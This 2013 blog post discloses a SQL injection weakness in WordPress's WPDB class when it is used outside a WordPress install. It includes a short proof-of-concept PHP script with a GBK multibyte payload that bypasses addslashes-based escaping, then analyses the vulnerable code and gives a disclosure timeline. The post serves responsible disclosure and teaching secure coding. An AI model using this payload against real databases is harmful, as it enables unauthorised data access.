---
layout: post
title: "Disclosure: WordPress WPDB SQL Injection Vulnerability"
permalink: 2013/07/disclosure-wordpress-wpdb-sql-injection.html
date: 2013-07-16
comments: true
categories:
- Security
tags:
- Disclosure
- Open Source
- PHP
- Security
- SQL Injection
---

At the current point in time there exists a very significant SQL Injection vulnerability in the WordPress code base. I want to make it abundantly clear that this does not affect anyone using WordPress "off the shelf". It only is exploitable if you use certain WordPress code outside of a WordPress install. So this is not a very "attackable" vulnerability. Or to put it in other terms, this is a high level vulnerability which has a very low threat level. It is also worth noting that it has not been fixed by WordPress (even 90 days after disclosure).<!--more-->
## Vulnerability Scope

I really want to stress here that the problem here is not that WordPress is insecure. Installed instances are immune to this particular vulnerability due to specifics of the implementation. 

The reason that I am treating this like an actual vulnerability is that I firmly believe that open source projects need to lead by example. That's the big issue that needs to be fixed here... And the vulnerability here is something that is extremely well known and the rest of the industry has moved past...

## The Vulnerability

So let me show the proof-of-concept code here:

```php
// Fill in credentials here:
$host = '';
$user = '';
$pass = '';
$dbname = '';
 
/** Hack Below */
 
function apply_filters($name, $arg) { return $arg; }
 
define('WP_DEBUG', false); // Not necessary
define('DB_CHARSET', ''); // Necessary
 
require_once dirname(__FILE__) . '/wp-includes/wp-db.php';
 
$db = new WPDB($user, $pass, $dbname, $host);
 
$payload = '%' . chr(0xbf) . chr(0x27) . " OR 1=1 /*";
 
$stmt = $db->prepare(
    'SELECT * 
        FROM INFORMATION_SCHEMA.CHARACTER_SETS 
        WHERE CHARACTER_SET_NAME = %s 
        LIMIT 1', 
    $payload
);

var_dump($db->query($stmt));
```

When this code is installed with a specifically configured MySQL server (expecting GBK character set by default), that SQL Injection will work.

So basically any time the character set is not explicitly set by the user and the external site is using a specific class of character sets (GBK and Big5, among others), this is vulnerable.


But let me make it clear again, this is an extremely narrow case that likely directly affects literally 0 applications on the internet. The point of this disclosure is not that people are affected. It's that this should never even be possible in 2013...## The Vulnerable Code

To see why this works, let's take a look at the [WPDB class](https://github.com/WordPress/WordPress/blob/2ac8311b74063e43ca5a1c886ad706e98b6a0910/wp-includes/wp-db.php). 

```php
function escape( $data ) {
    if ( is_array( $data ) ) {
        foreach ( (array) $data as $k => $v ) {
            if ( is_array( $v ) )
                $data[$k] = $this->escape( $v );
            else
                $data[$k] = $this->_weak_escape( $v );
        }
    } else {
        $data = $this->_weak_escape( $data );
    }

    return $data;
}
```

So looking at that, escape just proxies to `_weak_escape()`... And what's `_weak_escape()` you ask?

```php
function _weak_escape( $string ) {
    return addslashes( $string );
}
```

Yeah. So... If you're not aware of the issue here, I HIGHLY recommend reading [this post on addslashes](http://shiflett.org/blog/2006/jan/addslashes-versus-mysql-real-escape-string) by Chris Shiftlett from 2006...

But it gets better! There's a prepare method that simulates prepared statements! Let's look at how that works...

```php
function prepare( $query, $args ) {
    if ( is_null( $query ) )
        return;

    $args = func_get_args();
    /*snip*/
    array_walk( $args, array( $this, 'escape_by_ref' ) );
    return @vsprintf( $query, $args );
}
```


So it calls `escape_by_ref`... Surely that does something sane...?

```php
function escape_by_ref( &$string ) {
    if ( ! is_float( $string ) )
        $string = $this->_real_escape( $string );
}
```


Ok, so now there's a `_real_escape` function? I wonder what that does?

```php
function _real_escape( $string ) {
    if ( $this->dbh && $this->real_escape )
        return mysql_real_escape_string( $string, $this->dbh );
    else
        return addslashes( $string );
}
```


Oh cool! There's `mysql_real_escape_string()`! But wait, there's a conditional... It's checking for a connection (and if there isn't one yet, it's insecurely escaping). Then it's checking if the `real_escape` property is true. I wonder how that's set:

In the `set_charset() `function, it checks a few parts. First, it checks to see if the database supports collations. Then it checks to see if it supports charsets. Then it checks to see if we're explicitly setting a charset. Only then will it switch from `addslashes() `to `mysql_real_escape_string()`:

```php
if ( $this->has_cap( 'collation' ) && ! empty( $charset ) ) {
    if ( function_exists( 'mysql_set_charset' ) && $this->has_cap( 'set_charset' ) ) {
        mysql_set_charset( $charset, $dbh );
        $this->real_escape = true;
    } else {
        $query = $this->prepare( 'SET NAMES %s', $charset );
        if ( ! empty( $collate ) )
            $query .= $this->prepare( ' COLLATE %s', $collate );
        mysql_query( $query, $dbh );
    }
}

```


So if you're using an older version of MySQL (below 5.0.7), you'll never use real_escape_string (ever). If, like in our proof-of-concept script above, you're not explicitly setting the charset, it will never use `mysql_real_escape_string()`.

In short, this is REALLY overly complicated and makes security the edge-case rather than the other way around.## Disclosure Timeline

 * April 17 - Initial report sent to lead developer (at his request)
 * April 17 (10 minutes later) - Response acknowliding issue and discussing potential solution
 * June 23 - I emailed stating intention to disclose on July 1, as it has not been fixed nor has progress been made
 * June 23 (10 minutes later) - Response indicating a plan of action. Promise to send code within 24 hours.
 * June 23 - I agree to delay disclosure to July 16, to give more time.
 * July 14 - I received an email requesting an additional 2 weeks, stating that I would get code "within 24 hours" again.
 * July 14 - I declied the request of an additional 2 weeks, as no progress has been shown other than under threat of disclosure.
 * July 16 - Disclosure (still no code received)


So basically, nothing has happened of significance. Which is why I chose to disclose after 90 days. I initially intended to disclose at 60 days, but decided to delay to 75 as it's not a high threat level. Then, when asked (there was progress to be made), I agreed to delay further to 90 days. But I cannot reasonably agree to go further. There has been 90 days since the original report. The fix is actually pretty straight forward. Simply replace all instances of `addslashes() `with `mysql_real_escape_string()`, and raise an error (or start a database connection) if the connection is not active. It's a 5 line patch (well, 5 lines of logic change, the "cleanup" it will allow is much greater)...


Note: I realize that it might not wind up being a 5 line patch, that there may be some circumstances that warrant more changes. So far I have seen nothing to indicate that this is the case (no evidence of actual issues that need to be solved with the original concept).

## Security Is A Responsibility


I've been quoted before as saying that open source projects have a responsibility to their users and to the greater community to lead by example. This case is one where the WordPress project really needs to learn this lesson.

First, the fact that `addslashes() `exists in a database layer in any form in 2013 is down right disturbing. Disturbing doesn't even describe it. It's simply gross negligence. And what's worse is that it's not that the developers didn't understand the problem. And it's not that they didn't think it was a problem. They agreed it was a problem (albeit a narrow one). And that makes it infinitely worse in my opinion. Because that means it's intentional. And that's inexcusable.

To be clear, I'm not trying to attack the individual developers on the project. The individual developers are indeed smart and rational people. The problem as I see it is the policies and practices that the project as a whole have put in place.


But further is the communication that has happened since reporting. After the initial report, the next response I got was over 2 months later when I threatened to disclose. And I was promised code within 24 hours, which I never got. The next time I heard anything was 2 days before the agreed-upon delayed disclosure date. This is not how to handle one of the largest projects in the world. Even if it is a narrow issue.

Really, I'm quite disapointed here.
